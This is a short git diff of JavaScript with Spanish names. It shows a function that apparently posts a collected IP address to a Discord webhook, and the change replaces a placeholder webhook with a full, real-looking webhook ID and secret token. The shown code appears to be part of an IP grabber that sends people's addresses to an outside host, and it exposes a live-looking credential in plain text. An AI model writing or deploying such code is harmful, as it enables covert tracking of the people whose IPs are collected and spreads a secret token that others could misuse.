@@ -6,7 +6,7 @@ async function obtenerIP() {
 }
 
 async function enviarIPaDiscord(ip) {
-  const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN'; // Reemplaza con tu webhook
+  const webhookURL = 'https://discord.com/api/webhooks/1379598670550405290/r6g0SLry7T_R4QrIbW04u3CG06C6nqRVLsOzDeajGR6UTS6qmFcFZ3K7u-gvhAeJYubU'; // Reemplaza con tu webhook
   await fetch(webhookURL, {
     method: 'POST',
     headers: {
